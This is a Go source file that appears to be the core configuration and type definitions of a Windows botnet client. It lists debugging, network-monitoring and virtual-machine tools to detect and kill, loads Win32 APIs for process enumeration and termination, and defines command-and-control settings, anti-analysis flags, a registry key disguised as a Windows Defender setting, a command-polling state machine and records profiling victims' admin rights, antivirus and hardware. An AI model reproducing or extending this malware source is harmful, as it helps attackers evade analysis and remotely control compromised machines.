package components

import (
	"math/rand"
	"syscall"
	"time"
)

var (
	// Debugger list
	debuggers = [...]string{
		"NETSTAT",
		"FILEMON",
		"PROCMON",
		"REGMON",
		"CAIN",
		"NETMON",
		"Tcpview",
		"vpcmap",
		"vmsrvc",
		"vmusrvc",
		"wireshark",
		"VBoxTray",
		"VBoxService",
		"IDA",
		"WPE PRO",
		"The Wireshark Network Analyzer",
		"WinDbg",
		"OllyDbg",
		"Colasoft Capsa",
		"Microsoft Network Monitor",
		"Fiddler",
		"SmartSniff",
		"Immunity Debugger",
		"Process Explorer",
		"PE Tools",
		"AQtime",
		"DS-5 Debug",
		"Dbxtool",
		"Topaz",
		"FusionDebug",
		"NetBeans",
		"Rational Purify",
		".NET Reflector",
		"Cheat Engine",
		"Sigma Engine",
	}
	g_seed = rand.New(rand.NewSource(time.Now().UTC().UnixNano()))

	g_guid        = ""
	g_token       = ""
	g_regpath     = "Software/WinDefConfig"
	g_installdate = ""

	// Dlls loading
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	psapi    = syscall.NewLazyDLL("psapi.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	// win32 api
	pfnCreateMutexW         = kernel32.NewProc("CreateMutexW")
	pfnIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
	pfnTerminateProcess     = kernel32.NewProc("TerminateProcess")
	pfnEnumProcesses        = psapi.NewProc("EnumProcesses")
	pfnEnumProcessModules   = psapi.NewProc("EnumProcessModules")
	pfnGetModuleBaseNameW   = psapi.NewProc("GetModuleBaseNameW")
	pfnOpenProcess          = kernel32.NewProc("OpenProcess")
	pfnCloseHandle          = kernel32.NewProc("CloseHandle")
	pfnGetLastError         = kernel32.NewProc("GetLastError")
	pfnGetTokenInformation  = advapi32.NewProc("GetTokenInformation")
	pfnOpenProcessToken     = advapi32.NewProc("OpenProcessToken")
	pfnGetCurrentProcess    = kernel32.NewProc("GetCurrentProcess")
	pfnGetVolumeInformation = kernel32.NewProc("GetVolumeInformationW")

	botcore = BotCore{
		version:       "1.5.6",
		hosts:         []string{"127.0.0.1:8080"},
		singleton:     true,
		sington_mutex: 0,
		anti_debug:    false,
		anti_vm:       false,
		anti_sandbox:  false,
		install:       false,
		use_ssl:       false,
		delay:         0,
		mutex_name:    "eSq3w0KtD7gDMR7q",
		install_file:  "",
	}
)

const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_READ = 0x0010
const PROCESS_TERMINATE = 0x0001
const TOKEN_QUERY = 0x0008
const TokenElevation = 20

type BotState int

const (
	StateReadGuid BotState = iota
	StateGenGuid
	StateReadToken
	StateRecoverPoll
	StateCommandPoll
	StateError
)

type BotCore struct {
	version       string
	hosts         []string
	singleton     bool
	sington_mutex uintptr
	anti_debug    bool
	anti_vm       bool
	anti_sandbox  bool
	install       bool
	use_ssl       bool
	delay         uint
	mutex_name    string
	install_file  string
}

type Win32_Process struct {
	Name string
}

type Win32_BIOS struct {
	SerialNumber string
}

type Win32_VideoController struct {
	Name          string
	PNPDeviceID   string
	AdapterRAM    uint64
	DriverVersion string
}

type Win32_ComputerSystem struct {
	Manufacturer string
	Model        string
}

type ServerReply struct {
	Status  int               `json:"status"`
	Cmd     string            `json:"cmd"`
	TaskId  int64             `json:"taskid"`
	Args    map[string]any    `json:"args"`
	Error   string            `json:"error"`
	Headers map[string]string `json:"-"`
}

type Report struct {
	Guid    string         `json:"guid"`
	TaskID  string         `json:"task_id"`
	Success bool           `json:"success"`
	Output  string         `json:"output"`
	Error   string         `json:"error"`
	Extra   map[string]any `json:"extra"`
}

type Client struct {
	Id          int    `json:"id"`
	Guid        string `json:"guid"`
	Token       string `json:"token"`
	Ip          string `json:"ip"`
	Whoami      string `json:"whoami"`
	GuidHash    string `json:"guid_hash"`
	Os          string `json:"os"`
	Installdate string `json:"installdate"`
	Isadmin     string `json:"isadmin"`
	Antivirus   string `json:"antivirus"`
	Cpuinfo     string `json:"cpuinfo"`
	Gpuinfo     string `json:"gpuinfo"`
	Version     string `json:"version"`
	Lastseen    string `json:"lastseen"`
	Lastcommand string `json:"lastcommand"`
}

type BuildConfig struct {
	Version      string   `json:"version"`
	Host         []string `json:"host"`
	Single       bool     `json:"single"`
	Anti_debug   bool     `json:"anti_debug"`
	Anti_vm      bool     `json:"anti_vm"`
	Anti_sandbox bool     `json:"anti_sandbox"`
	Install      bool     `json:"install"`
	Install_file string   `json:"file"`
	Mutex_name   string   `json:"mutex"`
	Delay        uint     `json:"delay"`
	Use_ssl      bool     `json:"ssl"`
}
